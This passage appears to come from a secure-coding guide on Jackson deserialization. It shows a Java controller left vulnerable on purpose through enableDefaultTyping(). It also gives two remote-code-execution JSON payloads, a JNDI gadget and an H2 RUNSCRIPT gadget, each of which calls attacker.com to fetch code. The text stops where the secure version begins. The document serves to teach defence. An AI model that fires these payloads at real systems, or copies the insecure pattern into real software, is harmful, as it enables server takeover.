Jackson deserialization can be extremely dangerous if not configured properly, especially when using polymorphic type handling or outdated versions. The FasterXML Jackson library has had numerous critical CVEs (CVE-2019-12384, CVE-2020-35490, CVE-2020-35491) that allow remote code execution through carefully crafted JSON payloads.

**VULNERABLE CODE**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class UserController {

    // DANGEROUS: Default typing enabled globally
    private static final ObjectMapper mapper = new ObjectMapper();

    static {
        // VULNERABLE: Enables polymorphic deserialization for all types
        mapper.enableDefaultTyping();
    }

    public void processUserData(HttpServletRequest request, 
                                 HttpServletResponse response) throws IOException {
        String jsonData = request.getReader().lines()
            .reduce("", (acc, line) -> acc + line);

        // VULNERABLE: Deserializing untrusted input with default typing
        Object userData = mapper.readValue(jsonData, Object.class);

        // Process the user data
        System.out.println("Received: " + userData);
    }
}
```

**Attack Payload**:
```json
[
  "com.sun.rowset.JdbcRowSetImpl",
  {
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
]
```

**Alternative RCE Payload (CVE-2019-12384)**:
```json
[
  "ch.qos.logback.core.db.DriverManagerConnectionSource",
  {
    "url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'"
  }
]
```

**Why This Is Dangerous**:
- `enableDefaultTyping()` allows attackers to specify arbitrary classes to instantiate
- Jackson will deserialize any class on the classpath that has a default constructor
- Gadget classes like JdbcRowSetImpl can trigger JNDI injection leading to RCE
- Outdated Jackson versions (pre-2.10) have known exploitable gadget chains
- Attack requires only HTTP access to endpoints accepting JSON

**SECURE VERSION**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
